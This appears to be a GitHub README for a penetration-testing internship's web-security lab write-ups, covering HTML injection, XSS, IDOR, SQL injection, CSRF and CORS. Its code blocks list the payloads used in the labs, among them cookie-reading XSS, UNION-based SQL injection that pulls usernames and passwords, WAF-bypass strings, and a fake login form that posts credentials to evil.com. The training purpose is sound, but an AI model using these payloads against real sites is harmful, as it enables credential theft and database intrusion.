# Hacktify Cybersecurity Labs & Writeups

## Overview
Welcome to the Hacktify Cybersecurity (HCS) - Penetration Testing Internship 2025 Labs repository! This repository contains hands-on labs and detailed writeups on various web security vulnerabilities. Each section includes a walkthrough and documentation to help security enthusiasts and professionals understand and mitigate these vulnerabilities.

🔗 Documentation: [**GitHub**](https://github.com/reyincyber/Hacktify-CS); [**Medium**](https://medium.com/me/stories/public); [**YouTube**](https://www.youtube.com/watch?v=GBzzOPzwKU4&list=PLlC9xarFXu2uGxKL1Xr7hy3TH13YOVY8U)

---

## HTML Injection
[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/HTML%20Injection) | [Medium Writeup](https://cyberrey.medium.com/html-injection-labs-walkthrough-hacktify-internship-8406228e9fd2) | [YouTube](https://youtu.be/GBzzOPzwKU4)

Despite being considered a "legacy" vulnerability, HTML Injection remains prevalent. During my labs, I exploited unsanitized input fields, demonstrating reflected and stored HTML injection scenarios. Real-world incidents, like the WooCommerce CVE-2024-9944 affecting over 7 million sites, highlighted its ongoing relevance. HTML Injection occurs when user input is not properly sanitized, allowing attackers to inject malicious HTML into web pages. This can lead to unauthorized modifications of page content, phishing attacks, and user impersonation.
```
Sub-lab 1: HTML’s are easy!
<h1>Test</h1>
<h1 style="color:red;">Hacked!</h1>

Sub-lab-3: File Names are also vulnerable!
<script>alert('XSS!')</script>.png

Sub-lab-4: File Content and HTML Injection a perfect pair!
<form action="http://evil.com/steal.php" method="POST">
  <input type="text" name="username" placeholder="Enter Username">
  <input type="password" name="password" placeholder="Enter Password">
  <input type="submit" value="Login">
</form>

Sub-lab-2.5: Injecting HTML using URL
http://labs....php?name=<h1>Injected</h1>
http://....php?<script>alert(document.cookie)</script>

Sub-lab-2.6: Encode IT!
%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E 
%3Cscript%3Ealert(document.cookie)%3C/script%3E
```


## Cross-Site Scripting (XSS)

[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/Cross-Site%20Scripting%20(XSS)) | [Medium Writeup](https://cyberrey.medium.com/cross-site-scripting-xss-hands-on-lab-9f07bb8c8de2) | [YouTube](https://youtu.be/5bZfqFwr1mc)

XSS attacks emerged as a recurring threat, allowing malicious scripts to hijack sessions, steal cookies, and deface content. I explored Reflected, Stored, DOM-based, and advanced encoding payloads. Real-world examples like XSS topping the 2024 CWE Top 25 reinforced its criticality. XSS vulnerabilities allow attackers to inject malicious scripts into web applications, which can execute in a victim's browser. This can lead to session hijacking, data theft, and website defacement.
```
Let’s Do IT!
<script>alert('XSS')</script>

Balancing is Important in Life!
<script>alert('Hacked')</script>
">Hacked!<script>alert('Hacked')</script>

XSS is everywhere!
<script>alert('Hacked!')</script>@test.com

Alternatives are must!
"><script>prompt(1)</script>@test.com

Developer hates scripts!
<img src=x onerror="alert('XSS: Developer Hates Scripts!')">
">hello<IMG SRC=javascript:alert(1)>@test.com"

Change the Variation!
<script>alert(document.cookie)</script>
"><img src="x" onerror="alert('XSS')">

Encoding is the key?
%22%3E%3Cscript%3Ealert%28%27XSS%3A+Encoded%21%27%29%3C%2Fscript%3E
%22%3Ehello%3CIMG+SRC%3Djavascript%3Aalert%281%29%3E%40test.com%22

XSS with File Upload (file name)
<img src=x onerror="alert('XSS: File Name Exploit')">

XSS with File Upload (File Content)
<script>alert(document.domain + 'XSS: File Content')</script>

Stored Everywhere!
First Name: <script>alert('Firstname Stored')</script>
Lastname: <img src=x onerror="alert('LName Stored TOO!')">
Email: ">hello<IMG SRC=javascript:alert(emailfieldnotsafetoo)>@test.com"

DOM’s are love!
https://..../lab_11.php
https://..../lab_11.php?coin=btc
https://..../lab_11.php?coin=eth
https://..../lab_11.php?coin=doge
https://..../lab_11.php?<img src =x onerror=confirm("COINS_HACKED!")>
```

## Insecure Direct Object References (IDOR)

[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/Insecure%20Direct%20Object%20References%20(IDOR)) | [Medium Writeup](https://cyberrey.medium.com/insecure-direct-object-references-idor-hands-on-lab-93adbdd99602) | [YouTube](https://youtu.be/avhAVlpv1jc) 

IDOR vulnerabilities surfaced through URL parameter manipulation, enabling unauthorized access to user data and account settings. Labs revealed scenarios where altering object references exposed sensitive information. IDOR occurs when an application exposes internal objects (such as database records) without proper access control. Attackers can exploit this to gain unauthorized access to sensitive data.
```
1.1 Give me my amount!!
https://…?id=11

1.2 Stop polluting my params!
id=4
id=1
https://…id=200

1.4 Change your methods!
https://…id=47
```

## SQL Injection (SQLi)

[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/SQL%20Injection%20(SQLi)) | [Medium Writeup](https://cyberrey.medium.com/sql-injection-sqli-hands-on-lab-d049af02b623) | [YouTube](https://youtu.be/XAS5fkZiwfQ) 

SQLi remains one of the most dangerous vulnerabilities. I demonstrated classic, error-based, blind, and even HTTP header injections. Labs showed bypassing weak WAF configurations and exploiting cookies, user-agent headers, and referrers. SQL Injection is a critical vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code. This can lead to data leaks, unauthorized access, and database corruption.
```
1. Strings & Errors Part 1
1" OR "1"="1

2. Strings & Errors Part 2
?id=1'
?id=1' UNION SELECT 1,2,3,4--+

3. Strings & Errors Part 3
?id=1' UNION SELECT username, password FROM users--

4. Let's Trick 'em!
'
1' || '1'='1

5. Booleans and Blind!
?id=1

6. Error-Based: Tricked
") or ("1")=("1 -- 
('a'='a and hi")or ("a"="a

7. Errors and POST!
' OR '1'='1 

8. User Agents Lead Us!
Log in with admin@gmail.com | admin123 
'
' OR '1'='1
" OR "1"="1

9. Referer Lead Us!
' OR 1=1--
" OR "1"="1.

10. Oh Cookies!
Log in with 'admin'
' union SELECT version(),user(),database()#

11. WAF's are Injected!
?id=1&id=0' +union+select+1,@@version,database()--+

12. WAF's are Injected Part 2
?id=1--
?id=1&param=UNI&param2=ON SEL&param3=ECT 1,2,3--
```

## Cross-Site Request Forgery (CSRF)

[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/Cross-Site%20Request%20Forgery%20(CSRF)) | [Medium Writeup](https://cyberrey.medium.com/cross-site-request-forgery-csrf-hands-on-lab-34346497f6bf) | [YouTube](https://youtu.be/P6YhvQkkSpY) 

CSRF exploits trust in authenticated sessions, allowing attackers to perform actions without user consent. Labs covered weak or missing token validation, improper session handling, and exploitation via XSS. CSRF attacks trick authenticated users into executing unwanted actions on a web application, often leading to account takeover, unauthorized transactions, or configuration changes.
```
5. XSS the saviour
<script>alert(document.cookie)</script>
```

## Cross-Origin Resource Sharing (CORS)

[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/main/Cross-Origin%20Resource%20Sharing%20(CORS)) | [Medium Writeup](https://medium.com/@cyberrey/cross-origin-resource-sharing-cors-hands-on-lab-6a1d0b1b4d64) | [YouTube](https://youtu.be/n1NhWGDGzHw) 

CORS misconfigurations can lead to unauthorized cross-origin data access. Labs illustrated dangers of wildcard policies, prefix/suffix matching, and trusting null or arbitrary origins. CORS misconfigurations can allow unauthorized cross-origin requests, leading to data exposure and security risks for web applications that fail to enforce strict access control policies.

## Hacktify WK4 CTF
[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/tree/8008ec0d8b2af76a3713b1448ccea066a1ec8894/Hacktify%20WK4%20CTF) | [Medium Writeup](https://medium.com/@cyberrey/hacktify-ctf-2025-week-4-eed64269651d)

This section contains the Hacktify Week 4 Capture The Flag (CTF) challenges and solutions, helping participants develop cybersecurity skills through practical problem-solving.
 The CTF challenges tested my skills across web exploitation, network forensics, reverse engineering, OSINT, and cryptography. I cracked encoded messages, reversed binaries, analyzed network captures, and uncovered hidden data. 
## HCPT Reports
[GitHub Repo](https://github.com/reyincyber/Hacktify-CS/blob/main/Hacktify%20HCPT%20Reports%20RU%20(1).pdf)

This report provides an in-depth analysis of various cybersecurity assessments conducted as part of the Hacktify HCPT program.

---

## Contributing
Contributions are welcome! If you have improvements, additional resources, or corrections, feel free to submit a pull request.

## License
This repository is maintained for educational purposes. Ensure responsible use of the information provided.

## Contact
For inquiries or discussions, feel free to reach out via [**LinkedIn**](https://linkedin.com/in/cyberrey)  | [**GitHub**](https://github.com/reyincyber/) | [**Medium**](https://medium.com/@cyberrey) | [**YouTube**](https://www.youtube.com/@reyincyber).
